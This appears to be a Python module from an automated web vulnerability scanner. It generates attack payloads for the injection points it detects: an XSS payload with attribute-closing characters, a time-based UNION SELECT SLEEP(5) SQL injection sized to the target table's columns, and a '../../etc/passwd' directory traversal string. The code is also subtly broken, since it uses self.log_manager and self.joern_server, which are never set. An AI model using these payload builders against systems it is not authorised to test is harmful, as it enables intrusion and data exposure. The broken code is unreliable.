from front_page import sql_manager

class PayloadManager():
    def __init__(self, model_manager):
        self.model_manager = model_manager

    def infer_xss_payload(self, vuln_parameter: str, interest_codes: list):
        # Step0: 首先判断注入的具体位置
        inject_position = self.model_manager.infer_inject_position("xss", vuln_parameter, interest_codes)
        # Step1: 根据注入位置确定闭合符号
        close_character = None
        tag = None
        attribute = None
        if isinstance(inject_position, dict):
            if "answer" in inject_position.keys() and "tag" in inject_position.keys() and "attribute" in inject_position.keys():
                tag = inject_position["tag"]
                attribute = inject_position["attribute"]
                # close_character = self.model_manager.infer_xss_payload_step1("xss", vuln_parameter, interest_codes, tag, attribute, choices)
                if inject_position["answer"].lower().find("yes") != -1:
                    code = " ".join(interest_codes)
                    parameter_pos = code.find(vuln_parameter)
                    close_character = "1\">"
                    if parameter_pos != -1:
                        temp_code = code[:parameter_pos]
                        single_pos = temp_code.rfind("='")
                        if single_pos == -1:
                            single_pos = temp_code.rfind("= '")
                        double_pos = temp_code.rfind('="')
                        if double_pos == -1:
                            double_pos = temp_code.rfind('= "')
                        if single_pos != -1 and (abs(single_pos - parameter_pos) < abs(double_pos - parameter_pos)):
                            close_character = "1\'>"
        # Step2: 挑选恶意代码(这里暂时先使用一个统一的恶意代码)
        malicious_code = "<img src=x onerror=alert(1)>"
        # malicious_code = self.model_manager.infer_xss_payload_step2("xss", vuln_parameter, interest_codes, tag, attribute, close_character, choices)
        # Step3: 挑选连接符号
        payload = malicious_code
        if close_character:
            payload = close_character + " " + malicious_code + " "
        if tag:
            payload += "<" + tag.strip("<").strip(">")
        # connect_character = self.model_manager.infer_xss_payload_step3("xss", vuln_parameter, interest_codes, tag, attribute, payload, choices)
        return payload

    def infer_sql_payload(self, vuln_parameter: str, interest_codes: list):
        # Step0: 首先判断注入的具体位置
        inject_position = self.model_manager.infer_inject_position("sql injection", vuln_parameter, interest_codes)
        # Step1: 根据注入位置确定闭合符号
        close_character = None
        if isinstance(inject_position, dict):
            if "answer" in inject_position.keys():
                # close_character = self.model_manager.infer_xss_payload_step1("xss", vuln_parameter, interest_codes, tag, attribute, choices)
                if inject_position["answer"].lower().find("yes") != -1:
                    code = " ".join(interest_codes)
                    parameter_pos = code.find(vuln_parameter)
                    close_character = "\'"
                    if parameter_pos != -1:
                        temp_code = code[:parameter_pos]
                        single_pos = temp_code.rfind("='")
                        if single_pos == -1:
                            single_pos = temp_code.rfind("= '")
                        double_pos = temp_code.rfind('="')
                        if double_pos == -1:
                            double_pos = temp_code.rfind('= "')
                        if double_pos != -1 and (abs(single_pos - parameter_pos) > abs(double_pos - parameter_pos)):
                            close_character = "\""
        # Step2: 挑选恶意代码
        malicious_code = "SLEEP(5)"
        if close_character:
            db_triple = None
            for code in interest_codes:
                if code.find(vuln_parameter) != -1:
                    temp_db_triple = self.model_manager.extract_db_triple(code, vuln_parameter)
                    if temp_db_triple["answer"].lower().find("yes") != -1:
                        db_triple = temp_db_triple
                        break
            column = 1
            if db_triple is not None:
                column = len(db_triple["column"])
                if "*" in db_triple["column"]:
                    sql_structure = {}
                    self.log_manager.log_info(f'Scaning SQL Structure: {self.joern_server.repo_path}', False, 3)
                    sql_manager.scan_repo_sql(self.joern_server.repo_path, sql_structure)
                    self.log_manager.log_result('sql_structure', sql_structure)
                    if db_triple["table"] in sql_structure.keys():
                        column = len(sql_structure[db_triple["table"]])
            column = max(column, 1)
            malicious_code = ""
            for i in range(0, column):
                if i != (column - 1):
                    malicious_code += str(i + 1) + ","
                else:
                    malicious_code += "SLEEP(5)"
            malicious_code = "1" + close_character + " UNION SELECT " + malicious_code
        # Step3: 挑选连接符号
        payload = malicious_code + "-- "
        return payload

    def infer_dt_payload(self, vuln_parameter: str, interest_codes: list):
        # 处理目录穿越漏洞的payload(暂时直接给出一个默认的即可)
        return "../../etc/passwd"